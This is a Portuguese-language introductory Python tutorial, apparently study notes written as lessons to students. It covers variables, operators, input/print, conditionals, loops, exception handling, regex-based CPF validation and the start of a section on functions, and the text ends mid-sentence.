# Meus-Estudos-Python-

Olá alunos,

Vamos ver como criar variáveis e como uilizar os comandos input e print.

DECLARAÇÃO DE VARIÁVEIS
As variáveis em Python não precisam necessariamente serem declaradas no início do código, como acontece em C++, e também não é necessário declarar o tipo.

Para nomear as variáveis:

O primeiro caractere tem que ser um literal ou um underline _.
Deve ser um nome contínuo, sem espaços em branco.
Não deve-se utilizar acentuação gráfica, ç, caracteres especiais, exceto o _.
Exemplo:

Idade, idade, _idade, idade2, idade_Aluno

TIPOS DE DADOS EM VARIÁVEIS
int  --> Números inteiros. Ex: ra = 6786324

float --> Números com partes fracionárias. Ex: salario = 2345.67

complex --> Números complexos. Ex: x = 5 + 6j

bool --> Booleano, retorna True ou False. Ex: x = True

string --> Caracteres. Ex: nome = “Denilson Schäffer” ou nome = ‘Denilson Schäffer’

SINAIS DE ATRIBUIÇÃO       
Para atribuir (carregar) um valor em uma variável podemos utilizar o sinal  “=“.

Exemplo:

X = 5

SINAIS DE COMPARAÇÃO DE IGUALDADE
Para comparar a igualdade entre valores de variáveis ou entre valores e variáveis, utilizando dois sinais de “==“.

Exemplos:

X == 5

X == Y

OPERADORES UTILIZADOS EM PYTHON
OPERADORES ARITMÉTICOS:         

+            Adição

-             Subtração

*             Multiplicação

/             Divisão

//            Divisão parte inteira

**           Exponencial

%          Retorna resto da divisão

OPERADORES RELACIONAIS:

>           Maior que

<           Menor que

>=         Maior ou Igual

<=         Menor ou Igual

==         Igual

!=          Diferente

OPERADORES LÓGICOS:     

and       Retorna verdadeiro se ambas ou mais expressões forem verdadeiras.

or         Retorna verdadeiro se uma das expressões forem verdadeiras.

not       Inverte a expressão se verdadeira passa para falso e vice-versa.

EXEMPLOS:   

10 // 3     #retorna 3, considerando somente a parte inteira do resultado.

2 ** 3      #retorna 8, 2 elevado a 3, podemos utilizar também pow(2,3).

5 % 2      #retorna 1, que é o resto desta divisão.

>>> nome = 'Denilson'

>>> nome == 'Denilson'

True

>>> nome is not 'Denilson'

False

>>> nome != 'Denilson'

False

COMANDOS DE I/O (INPUT/OUTPUT)        
Pré-definidos pela linguagem:

LER     ==>   Receber dados de um dispositivo de entrada como o teclado.

Em Python, utilizamos o comando: input(‘Mensagem’).

Exemplo:

ra = input(‘Digite o número do RA:’)

                OU

ra = int(input(‘Digite o número do RA:’))

ESCREVER   ==>   Envia dados de uma variável de saída para a tela.

Em Python, utilizamos o comando: print(“Mensagem”).

Exemplo:

print(“O número do RA é: “, ra)

*** A mensagem tipo texto é colocada entre aspas e colocando o nome da variável será impresso o valor da variável ra.
 A vírgula concatena a mensagem e o valor da variável.

EXEMPLO 1:  

Desenvolva um script para receber as notas e calcular a média aritmética simples dos alunos, considerando que a média é composta por três notas:

#Cálculo da média simples de 3 notas
media = 0.0
nota1 = float(input('Digite a primeira nota: '))
nota2 = float(input('Digite a segunda nota: '))
nota3 = float(input('Digite a terceira nota: '))
media = (nota1 + nota2 + nota3)/3
print("O valor da média final é: ", media)
input('Pressione Enter para sair...')
Analisando o exemplo 1:

A linha 1 é um comentário.
Na linha 2 criamos a variável media e atribuirmos um valor inicial 0.0 e como não precisamos declarar o tipo, o interpretador
 já irá determinar que a variável media é do tipo float.
A partir da linha 3, já criamos três variáveis (nota1, nota2 e nota3), determinamos como float, utilizamos o comando input,
 exibindo a mensagem ao usuário: “Digite a nota:”, o interpretador ficará aguardando o usuário entrar com o valor via teclado 
e o usuário ao digitar a nota, esta já será atribuída às variáveis nota1, nota2 e nota3.
Na linha 6 calculamos a média.
Na linha 7 imprimimos a mensagem: O valor da média final é: e o valor da variável media.
A linha 8 é opcional, mas ao executarmos o script diretamente com duplo clique do mouse, o script executará e irá fechar.
 Para que possamos ver o resultado, colocamos esta linha de comando que ficará aguardando o usuário pressionar a tecla ENTER para encerrar a aplicação.
Vamos ver um exemplo, entrando com as notas: 6, 9 e 6 e verificando o resultado na mensagem da linha 4:

Digite a primeira nota: 6
Digite a segunda nota: 9
Digite a terceira nota: 6
O valor da média final é:  7.0
Pressione Enter para sair...
--------------------------------------------------------------------------------------------------------------
Olá alunos,

Vamos ver um dos principais recursos da lógica de programação: os comandos de decisão.

O if executa um conjunto de comandos de acordo com uma ou mais condições.

Lembre-se que o if é um bloco de instruções dentro de um código, portanto devemos abrir e fechar este bloco. Mas como fazer isto em Python?

Na lógica, em português estruturado temos:

SE condição ENTÃO

            Comando;

FIM SE;

Agora em Python:

if condição:

            comando

Para abrir: basta colocar o comando if (em letras minúsculas) e em outras linguagens, como Pascal, podemos utilizar a clausula 
THEN representando o ENTÃO, em C podemos utilizar a chave “{“, mas observe que em Python, basta utilizar os dois pontos “:”
 depois da condição. O interpretador então irá executar o comando ou os comandos que estão logo após os dois pontos.

Agora, note que os comandos do if estão com um recuo (indentação) e para encerrar o bloco if, basta, na próxima linha do código, tirar o recuo.

O interpretador vem executando linha a linha do código de acordo com a sequência programada, quando encontra um bloco if, 
o interpretador verifica a condição do if, se for verdadeira, o interpretador “entra” no bloco if e realiza o comando ou os 
comandos deste bloco, caso contrário, não entra no bloco if e continua a execução do código. Por isso, o bloco if também é conhecido como um desvio.

Podemos utilizar recursos opcionais em conjunto com o bloco if que são os comandos else e elif:

if condição:

        relação_de_comandos

else:

        relação_de_comandos

No caso acima, o else pertence ao bloco if e isto significa, que se o interpretador entrar neste bloco, não sairá sem
 realizar um dos comandos, pois se a condição do if não for verdadeira, serão executados o comando ou comandos do else (jamais coloque alguma condição no else).

if condição_1:

            relação_de_comandos_1

elif condição_2:

            relação_de_comandos_2

else:

            relação_de_comandos_3

Uma outra opção é utilizar o comando elif que corresponde aos dois comandos juntos: else + if, que significa

: senão se. Este recurso é utilizado quando há necessidade que o mesmo bloco if analise mais de uma condição
 e podemos utilizar quantos elif forem necessários em um mesmo bloco if.

Lembrando que para criar as condições, utilizaremos os seguintes operadores:

OPERADORES RELACIONAIS
>                      Maior que

<                      Menor que

>=                    Maior ou Igual

<=                    Menor ou Igual

==                    Igual

!=                     Diferente

OPERADORES LÓGICOS
and     

or       

not

Os dois pontos “:” depois da expressão ou condição no comando if ou elif e depois do else, indica
 o início do bloco de instrução a ser executado. É equivalente ao “then” em Pascal ou a “{“ em C, Java.

if condição_1:  <=== A partir daqui inicia a execução dos comandos

** ---->  relação_de_comandos_1

elif condição_2:     <=== A partir daqui inicia a execução dos comandos

            relação_de_comandos_2

elif condição_3:     <=== A partir daqui inicia a execução dos comandos

            relação_de_comandos_3

else:     <=== A partir daqui inicia a execução dos comandos

            relação_de_comandos_4

EXEMPLO 1:

INDENTAÇÃO
Cuidado com a INDENTAÇÃO, se o bloco de instruções não for indentado, o programa não roda.

# Entra com um número e verifica se este número é par ou impar
vResultado = ""
vNum = int(input('Entre com um número: '))
if vNum % 2 == 0:
    vResultado = "PAR"
else:
    vResultado = "IMPAR"
print("O número é: ",vResultado) #Apresenta o resultado
Veja o resultado do exemplo:

Entre com um número: 45
O número é:  IMPAR
>>> 
 
Entre com um número: 54
O número é:  PAR
>>> 
Neste exemplo 1, na linha 2, criamos uma variável vResutado e atribuímos um valor vazio
 entre aspas e o interpretador já vai considerar esta variável como tipo string (caractere).

Na linha 3, utilizamos o comando input para receber um número inteiro via teclado, criando e
 atribuindo à variável vNum e determinamos como int( ), tipo inteiro, para a variável vNum.

Na linha 4, abriu-se um bloco if, passando uma condição: se a variável carregada com o valor dividida 
por 2, tiver como resto um valor igual a zero (o operador % retorna o resto de uma divisão), então a variável vResultado recebe “PAR”.

Na linha 6, temos um else, se a condição do if não for verdadeira, então a variável vResultado recebe “IMPAR” (linha 7).

Na linha 8 temos o comando print que apresenta o resultado, este comando não pertence ao bloco if, por isso está sem recuo, o
 interpretador considerará que a linha 7 é a última linha de comando do bloco if. Neste caso, se você utilizasse o comando 
print com a indentação, alinhando à linha 7, este comando faria parte do comando else.

EXEMPLO 2:

# Ao entrar com a média do aluno, classifica o conceito
media = float(input('Entre com a média do aluno: '))
if media <= 5:
    conceito = str("REGULAR")
elif media < 7:
    conceito = "BOM"
else:
    conceito = "EXCELENTE"
print("Conceito: ",conceito)
Veja o resultado do exemplo 2:

Entre com a média do aluno: 4.5
Conceito:  REGULAR
>>> 
 
Entre com a média do aluno: 6.5
Conceito:  BOM
>>> 
 
Entre com a média do aluno: 9
Conceito:  EXCELENTE
>>> 
Na linha 2, já criamos a variável media, atribuímos um valor de entrada via teclado e determinamos que
 a variável será de tipo float colocando a função input dentro do float ( ).

Na linha 3, abrimos um bloco if, passamos uma condição: se a média for menor ou até 5,0 então criamos a 
variável conceito, definimos como tipo string (caractere) com str(  ) e atribuímos o valor “REGULAR”.

Na linha 5, passamos uma outra condição com elif (senão se) se a média for maior que 5,0 e menor que 7,0, o conceito será “BOM”.

Na linha 7, colocamos um else, que significa se nenhuma das condições anteriores forem verdadeiras, então será 
atribuído à variável conceito o valor de ‘EXCELENTE”.

Na última linha mostramos o valor que estará carregado na variável conceito: se a média for de 0 a 5,0 o conceito
 será regular, se a média for entre 5,5 até 6,5 o conceito será bom e se a média for entre 7,0 e 10 o conceito será excelente.

EXERCÍCIO:    

Crie um script para calcular o desconto do INSS, de acordo com o salário informado pelo usuário, conforme a tabela de desconto abaixo:

Salário                                      Desconto        

Até R$ 1693,72                               8%      

De R$ 1693,73 a R$ 2822,90         9%      

De R$ 2822,91 a R$ 5645,80        11%    

Acima de R$ 5645,80                O desconto é de R$ 621,04.

Tente fazer o exercício antes de olhar a resposta abaixo!

print("\n* * * MOSTRA O DESCONTO DO INSS! * * *\n")
salario = float(input('Entre com o salário: '))
if salario <= 1693.72:
    inss = float(salario * 0.08)
elif salario >= 1693.73 and salario <= 2822.90:
    inss = salario * 0.09
elif salario >= 2822.91 and salario <= 5645.80:
    inss = salario * 0.11
else:
    inss = 621.04
print("O desconto do INSS será de: \n","%.2f"% inss)
input('Pressione ENTER para sair...')
A penúltima linha mostra o desconto do INSS conforme o salário digitado, a parte do comando print
 com "%.2f"% inss é uma formatação do valor da variável inss, como o resultado pode mostrar várias casas decimais, então
 estamos determinando para considerar somente até duas casas decimais: 2f (já que estamos trabalhando com centavos). Por exemplo, se
 fosse para considerar quatro casas decimais para o pi (3.1416), então poderíamos formatar: “%.4f”% pi. Também poderemos utilizar um 
outro recurso que produz o mesmo resultado, a função format  da seguinte forma:  “{:.2f}".format(inss).

* * * MOSTRA O DESCONTO DO INSS! * * *
 
Entre com o salário: 2645.86
O desconto do INSS será de: 
 238.13
Pressione ENTER para sair...
>>> 
 
 
* * * MOSTRA O DESCONTO DO INSS! * * *
 
Entre com o salário: 26458.66
O desconto do INSS será de: 
 621.04
Pressione ENTER para sair...
>>> 
------------------------------------------------------------------------------------------------------------------------------------
Olá alunos,

Vamos ver um dos principais recursos da lógica de programação: os comandos de repetição que 
junto com os comandos de decisão, praticamente conseguimos resolver qualquer problema do mundo real, utilizando esses recursos da lógica.

O loop também é um bloco de instruções dentro de um código e também devemos abrir e fechar este bloco.

Em português estruturado temos:

ENQUANTO condição verdadeira

REPITA

            Comandos;

FIM ENQUANTO;

Ou

PARA número de passos

REPITA

            Comandos;

FIM PARA;

Os comandos ficam em um loop (laço, repetição) e em algumas linguagens temos que colocar
 a palavra LOOP (repita) para iniciar a repetição e END LOOP; para finalizar o loop.

Agora em Python:

WHILE (CONDICIONAL)
Repete um bloco de comandos (entra em loop) enquanto a condição que segue o comando while for 
verdadeira, ou seja, o laço (loop) está sob a condição do while (é condicional) e parará de repetir o comando ou 
os comandos quando a condição deixar de ser verdadeira.

while condição:

            comandos

Para abrir o loop: basta colocar o comando while (em letras minúsculas) e utilizar os dois pontos “:”
 depois da condição e o interpretador então irá executar o comando ou os comandos que estão logo após os dois pontos.

Agora, note também que os comandos do while estão com um recuo (indentação) e para encerrar o bloco basta, na próxima linha do código, tirar o recuo.

Exemplo 1:

Imprimindo os números de 1 a 30:

vNum = 1
while vNum <= 30:
	print(vNum)
	vNum = vNum + 1
input('FIM DO PROGRAMA!')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
FIM DO PROGRAMA!
Na linha 1, criamos a variável vNum e iniciamos com um valor, já determinando que a variável é do tipo número inteiro.

Na linha 2, abrimos o bloco loop com o while colocando a condição que enquanto a variável vNum for menor
 ou igual a 30, o conjunto de comandos dentro do bloco se repetira.

A linha 3 é o primeiro comado do laço (loop) e imprimirá o valor da variável vNum.

A linha 4 (que é o último comando do laço (loop) vai somar mais 1 ao valor da variável e atribuirá o 
resultado na própria variável vNum, que é conhecido como incremento da variável.

No primeiro “giro” do loop, vNum estará valendo 1 e por causa do comando print, será impresso na tela este valor, na
 sequência (linha 4) a variável mudará o valor para 2, a execução voltará para cima, testará a condição e como o valor de 
vNum  agora está valendo 2 e como 2 é menor que 30, então o loop executará novamente as linhas 3 e 4 dos comandos, e assim por 
diante, até que, na linha 4 o valor de vNum passe a valer 31 e como 31 não é menor e nem igual a 30, o interpretador encerrará a
 execução do bloco de comandos do loop e executará a última linha (5) do código. Esta linha 5 não pertence ao bloco do loop (while).

Outros operadores que poderemos utilizar são os operadores booleanos: True ou False.

Podemos também utilizar o comando break para sair do loop.

Exemplo 2:

Sorteando três números diferentes de 1 a 50:

import random
print("\n* * * SORTEANDO TRÊS NÚMEROS DIFERENTES ENTRE 1 E 50 * * *\n")
input("Pressione ENTER para gerar os números: ")
while True:
    num1 = random.randint(1,50)
    num2 = random.randint(1,50)
    num3 = random.randint(1,50)
    if num1 not in (num2,num3) and num2 != num3:
        break
print("Os números são:\n ",num1,num2,num3)
input("Pressione ENTER para sair...")
Em Python temos uma vasta biblioteca, que são rotinas já implantadas na linguagem, para utilizarmos,
 basta utilizar o comando import e o nome da rotina, no caso, a biblioteca random que possui várias funções (métodos) para gerar números aleatórios (randômicos).

Na linha 4, utilizamos o while com o operador booleano (George Boole): True (verdadeiro), note que a 
primeira letra T é em maiúsculo e o restante em minúsculo.

Nas próximas linhas, criamos três variáveis e utilizamos a função randint que pertence a biblioteca
 random (temos que fazer a referência com o ponto: random.randint) para gerar números aleatórios entre 1 a 50 (1,50) e os valores serão atribuídos às variáveis.

Na linha 8, temos um comando if com uma condição que analisa se todos os números gerados são diferentes para evitar de gerar dois ou mais números iguais.

Com o comando while em True, o loop será realizado infinitamente, ou seja, irá gerar três números 
aleatórios, mas com o comando if, se todos os números gerados forem diferentes (daí a condição se torna verdadeira), 
o comando break (breque!), será executado e o interpretador interromperá o loop e executará a última linha com o comando
 print, mostrando todos os números do sorteio. Caso contrário, se a função randômica gerar dois ou mais números iguais, o loop irá gerar 
números, até forem todos diferentes.

* * * SORTEANDO TRÊS NÚMEROS DIFERENTES ENTRE 1 E 50 * * *
 
Pressione ENTER para gerar os números: 
Os números são:
  28 14 33
Pressione ENTER para sair...
FOR (INCONDICIONAL)
Repete um bloco de comando n vezes, ou seja, até que a variável contadora atinja o seu valor final ou receba um comando break.

Diferente do while, o for não depende de uma condição (é incondicional) para o loop.

for contador in lista:

          bloco de comandos

Com o comando for determinamos quantas vezes o comando ou comandos vão repetir (loop). Logo depois
 da palavra for tem uma variável tipo número inteiro (contador), que a cada loop ela vai alterando o valor automaticamente, acrescentando mais um.

Mesmo Exemplo 1 com for:

for vNum in range(1,31):
	print(vNum)
input('FIM DO PROGRAMA!')
No primeiro “giro” a variável vNum vale 1 e este valor será impresso até o número 30, 
o comando print será executado 30 vezes. Algo a observar é que utilizamos a função range onde determinamos o valor
 inicial e o valor final (1,31). Lembre-se que, a exemplo do que também acontece na linguagem C, a primeira posição não inicia
 com 1 e sim com 0 (zero), então nesse caso, o 1 é a segunda posição. Assim o range de 1 até 31, será repetido 30 vezes.

Exemplo 3:

for atriz in ["Angelina Jolie","Julia Roberts","Megan Fox","Ivete Sangalo"]:
    if atriz != "Ivete Sangalo":
        print("A",atriz,"é uma atriz de Hollywood!")
    else:
        print("A", atriz,"NÃO é uma atriz de Hollywood!\n")
input('Pressione ENTER para sair...')
Neste exemplo, utilizamos o que é conhecido como lista, que em Python, basta colocar os valores em colchetes separados
 com vírgula. Automaticamente o interpretador irá, a cada loop, atribuir o valor a variável atriz de acordo com a fila em que
 os elementos estão na lista e como os elementos são do tipo string (caractere), a variável atriz já é considerada tipo str (string).

Dentro do bloco for tem um bloco if (observe a indentação) e os comandos print pertencem ao bloco if com o else (observe a indentação).

Analise o código do exemplo e tente perceber qual será o resultado:

A Angelina Jolie é uma atriz de Hollywood!
A Julia Roberts é uma atriz de Hollywood!
A Megan Fox é uma atriz de Hollywood!
A Ivete Sangalo NÃO é uma atriz de Hollywood!
 
Pressione ENTER para sair...
-------------------------------------------------------------------------------------------------------
Olá alunos,

Já percebemos que quando cometemos um erro criando o código e passamos por um compilador ou interpretador, este devolve uma mensagem de erro.

Como professor, já percebi que alguns alunos nem olham a mensagem de erro devolvida pelo interpretador e fecham
 a mensagem, mas para nós, da área de TI, necessitamos aprender a analisar as mensagens do interpretador ou do
 compilador para descobrir qual é o erro que estamos cometendo.

Às vezes, o interpretador mostra o número da linha onde ocorreu o erro, mas este pode estar nas linhas acima ou
 abaixo no código. Isto ocorre porque o interpretador obedece a uma hierarquia do código, por exemplo, se você 
está codificando com orientação a objeto, criou uma classe e o erro ocorreu em uma das linhas dentro dessa classe, 
o interpretador vai apontar o erro na linha da definição da classe.

É normal cometermos erros enquanto estamos codificando, mas estes erros ocorrem em tempo de compilação. Agora, temos
 que ter consciência que os erros podem ocorrer em tempo de execução, ou seja, quando o usuário estiver utilizando o sistema.

É dever também, dos desenvolvedores, prever que o usuário pode cometer erros no momento em que estiverem utilizando o
 programa e tratar estes erros. Este tipo de ação é chamada de tratamento de exceções (não é politicamente correto dizer
 que o usuário pode cometer erros e sim exceções! : )  ). 

TRATAMENTO DE EXCEÇÕES (ERROS)
Na maioria dos casos, o tratamento de exceções, é o retorno de uma mensagem ao usuário, porém, se não fizermos isto
 e ocorrer algum imprevisto, o interpretador devolverá a mensagem padrão dele e o pior que no idioma inglês, o que 
poderá deixar o usuário perdido e neste caso, poderemos retornar uma mensagem mais amigável e esclarecedora ao usuário.

Na linguagem Python, como em outras linguagens, temos o recurso de tratar exceções.

Então, vamos ver como fazemos isto em Python.

Em Java, temos que marcar o bloco onde pode ocorrer o erro com o comando try e tratar o erro com o comando catch, 
em PL utilizamos o comando exception. Em Python, marcamos o bloco onde pode ocorrer o erro com try e tratamos o erro na seção except:

try:

          comandos

except nome_exceção:

          comandos

O comando try (note que vem seguido de dois pontos “:”) monitora o bloco de comandos que estiverem logo após
 os dois pontos e se ocorrer algum erro em alguma destas linhas deste bloco, o interpretador irá para a seção except
 e se o erro foi tratado nesta seção, será executado o comando correspondente. Temos que declarar o nome da exceção que na 
realidade é uma classe da biblioteca Python.

Vamos ver o seguinte exemplo:

# divisão por dois números
numero1 = int(input('Entre com o primeiro número: '))
numero2 = int(input('Entre com o segundo número: '))
resultado = numero1 / numero2
print("O resultado é: ",resultado)
input('Pressione ENTER para sair...')
Neste exemplo, estamos entrando com dois números (dividendo e divisor) para serem divididos. Após a entrada
 dos números, dividimos um pelo outro e o resultado é atribuído na variável resultado. Em seguida, o resultado é mostrado quando for executada a linha 5.

Agora, vamos supor que o usuário entre com um valor para o primeiro número: 12 e depois, para o segundo número:
 0 (zero), como não existe divisão por zero, isto provocará uma exceção, lembro que na calculadora de bolso antiga,
 quando ocorria isto, o visor da calculadora mostrava “E” e travava (tínhamos que desligar e ligar novamente). No caso do
 exemplo, o interpretador mostrou a seguinte mensagem:

Entre com o primeiro número: 12
Entre com o segundo número: 0
Traceback (most recent call last):
  File "C:/Users/djsch/OneDrive/Área de Trabalho/divisao.py", line 4, in <module>
    resultado = numero1 / numero2
ZeroDivisionError: division by zero
Então vamos agora criar um tratamento de erro para o mesmo código:

# divisão por dois números
numero1 = int(input('Entre com o primeiro número: '))
numero2 = int(input('Entre com o segundo número: '))
try:
    resultado = numero1 / numero2
    print("O resultado é: ",resultado)
except ZeroDivisionError:
    print("Não é possível divisão por zero")
input('Pressione ENTER para sair...')
Na linha 4, colocamos a marcação com o try (seguido de dois pontos). As próximas 
linhas 5 e 6 serão monitoradas pelo try, se alguma exceção ocorrer neste bloco, a seção except será localizada e executado o comando da linha 8.

Na linha 7, abrimos a seção except para tratar o erro, passando o nome deste erro ou exceção: 
ZeroDivisionError. Note que utilizamos o nome do erro do Python, exibido na mensagem de erro do interpretador acima.

Em resumo, se ocorrer uma divisão por zero, e como esta execução está dentro do try, e este erro está
 determinado na seção except, a mensagem da linha 8 será exibida.

PRESTE ATENÇÃO:
Na indentação: as linhas 5 e 6 estão com recuo porque estão no try. A linha 8 está com recuo porque
 pertence a seção except. A linha 9 não pertence ao bloco de tratamento de exceção.

Agora veja o resultado:

Entre com o primeiro número: 12
Entre com o segundo número: 0
Não é possível divisão por zero
Pressione ENTER para sair...
Mas, se executarmos o mesmo código, sem ocasionar erros, a linha 6 será executada normalmente:

Entre com o primeiro número: 12
Entre com o segundo número: 2
O resultado é:  6.0
Pressione ENTER para sair...
Agora, vamos supor outros tipos de erros, no mesmo exemplo:

Entre com o primeiro número: a
Traceback (most recent call last):
  File "C:/Users/djsch/OneDrive/Área de Trabalho/divisao.py", line 2, in <module>
    numero1 = int(input('Entre com o primeiro número: '))
ValueError: invalid literal for int() with base 10: 'a'
Entre com o primeiro número: 5,5
Traceback (most recent call last):
  File "C:/Users/djsch/OneDrive/Área de Trabalho/divisao.py", line 2, in <module>
    numero1 = int(input('Entre com o primeiro número: '))
ValueError: invalid literal for int() with base 10: '5,5'
O usuário, no primeiro caso, entrou com um valor de string (letra a) em uma variável tipo
 numérica ou poderia ter, acidentalmente, pressionado ENTER, que ocorreria este erro.

No segundo caso, o usuário entrou com um valor 5,5 em vez da notação inglesa: 5.5, lembrando 
que na notação inglesa, a vírgula é só um separador de milhares enquanto o ponto, representa a 
parte fracionária. Exemplo: US$ 1,245,796.47 (um milhão, duzentos e quarenta e cinco mil, setecentos e noventa e seis dólares e quarenta e sete centavos).

Podemos também tratar este erro no mesmo código:

# divisão por dois números
try:
    numero1 = float(input('Entre com o primeiro número: '))
    numero2 = float(input('Entre com o segundo número: '))
    numero1 = numero1 / numero2
    print("O resultado é: ",numero1)
except ValueError:
    print("Valor inválido!")
except ZeroDivisionError:
    print("Não é possível divisão por zero")
input('Pressione ENTER para sair...')
Colocamos a marcação do bloco try no início do programa, senão de nada adiantará 
deixarmos a marcação na posição em que estava antes. Pois o erro ocorreria da mesma forma, porque o erro 
estaria fora do bloco try. Mudamos o tipo da variável numero1 e numero2 para float.

Abrimos duas seções except e utilizamos a mesma mensagem de erro do interpretador (ValueError) . Assim, 
se o usuário digitar letras, espaço em branco, valores com vírgulas, etc, os erros serão tratados, devolvendo mensagens ao usuário.

Vejam nos exemplos abaixo, o resultado na execução do código quando entramos com valores errados:

Entre com o primeiro número: 4
Entre com o segundo número: 0
Não é possível divisão por zero
Pressione ENTER para sair...
Entre com o primeiro número: 4
Entre com o segundo número: hh
Valor inválido!
Pressione ENTER para sair...
Entre com o primeiro número: 4,4
Valor inválido!
Pressione ENTER para sair...
Entre com o primeiro número: 4.4
Entre com o segundo número: 2
O resultado é:  2.2
Pressione ENTER para sair...
----------------------------------------------------------------------------------------------------------------------------
Olá alunos.

Como já foi dito, uma string é um vetor de caracteres e assim é internamente tratado pelo
 interpretador ou um compilador e as expressões regulares estão relacionadas a este conjunto de caracteres, expressões 
regulares, do inglês: regular expression ou pela sigla regex, veio da área da matemática e este termo foi introduzido 
na Ciência da Computação para designar um conjunto de caracteres a serem processados. 

EXPRESSÕES REGULARES
Expressões regulares são utilizadas nas seguintes situações:

Para validação de dados: se os dados de entrada obedecem ao padrão estabelecido.
Para busca de dados: encontra dados que podem conter uma parte (sub-string) de uma string.
Para Busca e substituição: recurso utilizado pela maioria dos aplicativos de editores de texto: buscam uma palavra correspondente e substituem por outro valor.
Para fragmentar(Split) de dados: Toda vez que encontrar um determinado caractere em uma string, esta string pode ser dividida (fragmentada).
Python fornece uma biblioteca para trabalhar com expressões regulares semelhante a linguagem Perl.

Esta biblioteca está no módulo re, e a principal função que utilizamos é a função de correspondência 
match, já que vamos precisar buscar, validar, fragmentar dados de um conjunto de caracteres.

Por exemplo, para a string de valor Uninove, o interpretador considera uma cadeia (vetor) simples de 
caracteres literais. Já o conjunto de caracteres, conhecidos como especiais: \ ’ ? $ + - * [  ] {  } ( ) | são considerados símbolos.

Vimos que \n utilizados em uma mensagem de texto, tanto no comando input quanto no print pula uma linha, 
porém, se tirarmos a barra \ o n  passa a ser um simples literal.

Algo importante também que utilizamos para fazer buscas é o quantificador, que é representado entre {  } que podemos adicionar um valor interno.

Por exemplo, para aceitar valores iniciais de um número de celular (por exemplo, 99876-1234) que tem 5
 números de 0 a 9, podemos definir: \d{5}, onde \d representa qualquer digito entre 0 a 9 e {5} é a quantidade de números iniciais do celular (99876).

Agora se quisermos aceitar todo o número de qualquer celular, com o padrão, por exemplo: 99876 - 1234,
 poderemos definir como: \d{5} - \d{4}, onde \d representa qualquer dígito de o a 9, {5} quantidade de números
 iniciais, - o hífen, \d qualquer dígito de 0 a 9 e {4}  quantidade de 4 dígitos finais.

Para busca: podemos utilizar os métodos match e search do módulo re.

Para substituição: podemos utilizar os métodos sub e subn do módulo re.

Para fragmentação: podemos utilizar os métodos split do módulo re.

Exemplo:

Buscar um número válido para o CPF:

# valida o número do cpf com pontos e hífens
import re
cpf = str(input('Entre com o número do CPF, com pontos e hífen: \n'))
if re.search('\d{3}.\d{3}.\d{3}-\d{2}', cpf):
    print('Número CPF validado')
else:
    print('Número do CPF fora do padrão')
input('Pressione ENTER para sair...')
Na linha 1, incluímos o módulo re.

Na linha 2, criamos a variável cpf ,tipo string (str), para receber o número do cpf no padrão 000.000.000-00.

Na linha 4, utilizamos o método search do módulo re. O formato do método é: search(padrão, string a ser comparada),
 no caso, o valor da variável cpf é a string a ser comaparada.

O padrão é a formatação '\d{3}.\d{3}.\d{3}-\d{2}' que significa: três números de 0 a 9, o ponto, mais três números,
 mais um ponto, mais três números, um hífen e mais dois números.

Vamos ver um exemplo, entrando com um número de cpf:

Entre com o número do CPF, com pontos e hífen: 
038.745.211-46
Número CPF validado
Pressione ENTER para sair...
Agora, digitando números de CPF fora do padrão.

Entre com o número do CPF, com pontos e hífen: 
038745.211-46
Número do CPF fora do padrão
Pressione ENTER para sair...
Entre com o número do CPF, com pontos e hífen: 
038.74.211-46
Número do CPF fora do padrão
Pressione ENTER para sair...
Modificando o código para aceitar o padrão 000000000-00 para o CPF:

# valida o número do cpf com pontos e hífens
import re
cpf = str(input('Entre com o número do CPF, com pontos e hífen: \n'))
if re.search('\d{3}\d{3}\d{3}-\d{2}', cpf):
    print('Número CPF validado')
else:
    print('Número do CPF fora do padrão')
input('Pressione ENTER para sair...')
Veja a resposta do exemplo.

Entre com o número do CPF, com pontos e hífen: 
038745211-46
Número CPF validado
Pressione ENTER para sair...
Este é só um exemplo, mas também podemos fazer o contrário, considerar os números do 
cpf sem ponto e sem hífen, no padrão 12345678911, daí é só modificar a linha 4, passando para o padrão search('\d{11}', cpf).

# valida o número do cpf com pontos e hífens
import re
cpf = str(input('Entre com o número do CPF, com pontos e hífen: \n'))
if re.search('\d{11}', cpf):
    print('Número CPF validado')
else:
    print('Número do CPF fora do padrão')
input('Pressione ENTER para sair...')
Agora, executando o código com um exemplo:

Entre com o número do CPF, com pontos e hífen: 
03874521146
Número CPF validado
Pressione ENTER para sair...
E ai, tente modificar o código para validar um CEP no padrão: 00000-000.
----------------------------------------------------------------------------------------------------------------------------------------------------
Olá alunos,

Como já vimos, a segunda geração de linguagens de programação: Pascal, C, por exemplo, 
surgem com um recurso principal, que não existiam nas linguagens anteriores, a possibilidade
 de criar funções, que em C, são conhecidas como functions e em Pascal, conhecidas como procedures.

Podíamos, então, encapsular instruções em funções, particionando o desenvolvimento do código. Estes 
recursos acabaram sendo um dos principais pilares das próximas linguagens de programação que surgiram como:
 C++, Java, C#., as linguagens orientadas a objetos. Tudo na orientação a objetos é encapsulado, blocado.

Vimos que os comandos de decisão: if, else, os comandos de repetição: for, while, são blocos também.

Então, em uma visão, do micro para o macro, podemos dizer que: um bloco if ou for ou while estão em um outro
 bloco que é uma função ou método e este método está num bloco maior conhecido como classe, estas classes podem 
estar relacionadas e este conjunto de classes relacionados formam um sistema, ou seja, um sistema de informação 
de uma empresa pode ser composto por um conjunto de classes relacionados, cada classe, que é um bloco, pode ser 
composto de uma ou mais funções, cada função, que é um bloco, pode ter vários comandos de decisão ou de repetição, que também são blocos.


Portanto, funções ou métodos servem para realizar funcionalidades, ações do sistema. Em Python podemos ter funções globais, locais ou lambda.

Python fornece uma vasta biblioteca de funções nativas, já implantadas, daí teremos que utilizar os nomes que
 a linguagem já criou, como por exemplo: print( ), input( ), pow( ), search( ), etc. mas, podemos personalizar 
as funções, criar a nossa própria função, “batizando-a” com um nome.

Como toda função em matemática é acompanhada por um par de parêntesis, por exemplo: f(x), onde posso passar um 
parâmetro, as funções em linguagens de programação também são acompanhadas de parêntesis, onde podemos ou não (é opcional) passar parâmetros ou argumentos.

CRIANDO FUNÇÕES EM PYTHON
Para criarmos as funções em Python, é necessário utilizar a cláusula def e a sintaxe básica é:

def nome_funcao (parâmetros):

            instruções

Em Python, toda função retorna um valor, por isso podemos utilizar a cláusula return, apesar de ser 
opcional a utilização de um valor para return, se não passarmos nenhum valor, o interpretador retornará none.

EXEMPLO 1:

>>> import math
>>> def raizQuadrada():
	return math.sqrt(81)
 
>>> raizQuadrada()
9.0
Neste exemplo, utilizamos o interpretador interativo para testar, criamos a função def 
denominando com o nome raizQuadrada, note que para criarmos nomes para funções, não utilize acentuação 
